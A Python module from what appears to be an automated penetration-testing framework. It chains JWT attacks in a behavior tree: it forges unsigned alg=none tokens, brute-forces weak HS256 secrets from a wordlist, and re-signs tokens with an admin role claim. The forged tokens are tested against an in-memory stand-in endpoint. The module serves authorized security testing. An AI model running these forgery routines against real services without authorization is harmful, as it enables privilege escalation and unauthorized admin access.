"""First end-to-end playbook: the JWT -> admin kill chain, built on py_trees.

A behavior-tree Selector (fallback) tries attacks in order and stops at the first that works:
``alg=none`` first, then ``brute weak HS256 secret -> forge admin token``. Each leaf runs real,
offline crypto (HMAC-SHA256), drives the ``JwtForgePrimitive`` through the Governor, replays the
forged token at a target, and — only on genuine access — hands evidence to the deterministic
Validator, which mints the ``Finding``.

This module imports ``py_trees`` (optional dep, install ``pentora[engine]``), so it is NOT
re-exported from ``pentora.engine.__init__`` — the core stays importable without it.

The ``DemoProtectedResource`` is an in-memory stand-in for the real ``/admin`` endpoint so the
whole chain runs offline in a test. In production it is replaced by a live replay primitive; the
playbook logic is identical.
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
from dataclasses import dataclass

import py_trees
from py_trees.behaviour import Behaviour
from py_trees.common import Status
from pydantic import BaseModel

from pentora.engine.blackboard import Blackboard
from pentora.engine.facts import AttackAttempt, Hypothesis, Secret, TestedNegative
from pentora.engine.primitive import (
    BlastRadius,
    Capability,
    Governor,
    Primitive,
    PrimitiveResult,
    RunContext,
    RunScope,
)
from pentora.engine.validator import DeterministicValidator

# ---- offline HS256 crypto (real) -------------------------------------------

def _b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _sign_hs256(signing_input: bytes, secret: str) -> str:
    return _b64url_encode(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())


def crack_hs256(token: str, wordlist: list[str]) -> str | None:
    """Return the secret if the token's HS256 signature matches any candidate, else None."""
    try:
        header_b64, payload_b64, sig = token.split(".")
    except ValueError:
        return None
    signing_input = f"{header_b64}.{payload_b64}".encode()
    for secret in wordlist:
        if hmac.compare_digest(_sign_hs256(signing_input, secret), sig):
            return secret
    return None


def forge_hs256(token: str, secret: str, claims: dict[str, object]) -> str:
    """Re-issue the token with overridden claims, signed with the recovered secret."""
    header_b64, payload_b64, _ = token.split(".")
    payload = json.loads(_b64url_decode(payload_b64))
    payload.update(claims)
    new_payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{new_payload_b64}".encode()
    return f"{header_b64}.{new_payload_b64}.{_sign_hs256(signing_input, secret)}"


def forge_alg_none(token: str, claims: dict[str, object]) -> str:
    """Build an unsigned alg=none token with overridden claims."""
    _, payload_b64, _ = token.split(".")
    header_b64 = _b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = json.loads(_b64url_decode(payload_b64))
    payload.update(claims)
    new_payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{new_payload_b64}."


@dataclass
class DemoProtectedResource:
    """In-memory stand-in for the real /admin endpoint. Validates HS256 with ``secret`` and
    returns admin content only when the token's ``role`` claim is admin."""

    secret: str

    def request(self, token: str) -> tuple[int, str]:
        try:
            h, p, sig = token.split(".")
        except ValueError:
            return 401, "malformed"
        if not hmac.compare_digest(_sign_hs256(f"{h}.{p}".encode(), self.secret), sig):
            return 401, "bad signature"
        claims = json.loads(_b64url_decode(p))
        if claims.get("role") == "admin":
            return 200, "ADMIN_PANEL: user list + secrets"
        return 403, "forbidden"


# ---- the primitive (driven through the Governor) ---------------------------

class JwtInput(BaseModel):
    jwt: str
    wordlist: list[str]


class JwtForgePrimitive(Primitive):
    name = "jwt_forge"
    version = "0.1"
    input_schema = JwtInput
    capability = Capability(
        read_only=True, destructive=False, idempotent=True, blast_radius=BlastRadius.PASSIVE
    )

    async def run(self, inp: BaseModel, ctx: RunContext) -> PrimitiveResult:
        if not isinstance(inp, JwtInput):
            return PrimitiveResult(summary="bad input", is_error=True)
        secret = crack_hs256(inp.jwt, inp.wordlist)
        if secret is None:
            return PrimitiveResult(summary="HS256 secret not in wordlist")
        forged = forge_hs256(inp.jwt, secret, {"role": "admin"})
        return PrimitiveResult(
            facts=[
                Secret(source=self.name, kind_of="jwt_hs256_secret", redacted=secret[:1] + "***"),
                AttackAttempt(source=self.name, primitive=self.name, outcome="success"),
            ],
            data={"forged_token": forged},
            summary="recovered weak HS256 secret; forged an admin token",
        )


# ---- the behavior tree -----------------------------------------------------

@dataclass
class JwtPlaybookContext:
    bb: Blackboard
    governor: Governor
    validator: DeterministicValidator
    hypothesis: Hypothesis
    jwt: str
    wordlist: list[str]
    resource: DemoProtectedResource

    def record_negative(self, what: str) -> None:
        self.bb.assert_fact(
            TestedNegative(source="jwt_playbook", what=what, derived_from=[self.hypothesis.id])
        )


class _AlgNoneLeaf(Behaviour):
    def __init__(self, pctx: JwtPlaybookContext) -> None:
        super().__init__("jwt_alg_none")
        self.pctx = pctx

    def update(self) -> Status:
        forged = forge_alg_none(self.pctx.jwt, {"role": "admin"})
        status, body = self.pctx.resource.request(forged)
        if status == 200 and "ADMIN" in body:
            return Status.SUCCESS
        self.pctx.record_negative("jwt alg=none rejected")
        return Status.FAILURE


class _BruteForgeLeaf(Behaviour):
    def __init__(self, pctx: JwtPlaybookContext) -> None:
        super().__init__("jwt_brute_forge")
        self.pctx = pctx

    def update(self) -> Status:
        p = self.pctx
        res = asyncio.run(
            p.governor.execute(
                JwtForgePrimitive(),
                JwtInput(jwt=p.jwt, wordlist=p.wordlist),
                RunContext(scope=RunScope(read_only=True), budget_requests=50),
            )
        )
        for f in res.facts:
            p.bb.assert_fact(f)
        token = res.data.get("forged_token")
        if not token:
            p.record_negative("jwt weak-secret brute failed")
            return Status.FAILURE
        status, body = p.resource.request(token)
        orig_status, _ = p.resource.request(p.jwt)   # differential control: the original token
        if status == 200 and "ADMIN" in body:
            evidence = {
                "forged_token_authorized": True,
                "original_token_authorized": orig_status == 200,
                "authorized_marker_present": "ADMIN" in body,
                "evidence_ids": [f.id for f in res.facts],
            }
            fact = p.validator.promote(p.hypothesis, evidence)
            if fact is not None:
                p.bb.assert_fact(fact)
            return Status.SUCCESS
        p.record_negative("forged token not accepted")
        return Status.FAILURE


def build_jwt_playbook(pctx: JwtPlaybookContext) -> Behaviour:
    """A fallback Selector: try alg=none, else brute + forge. First success wins."""
    root = py_trees.composites.Selector(name="jwt_forge", memory=False)
    root.add_children([_AlgNoneLeaf(pctx), _BruteForgeLeaf(pctx)])
    return root


def run_jwt_playbook(pctx: JwtPlaybookContext) -> Status:
    """Tick the tree once (leaves resolve synchronously) and return the root status."""
    tree = build_jwt_playbook(pctx)
    tree.tick_once()
    return tree.status
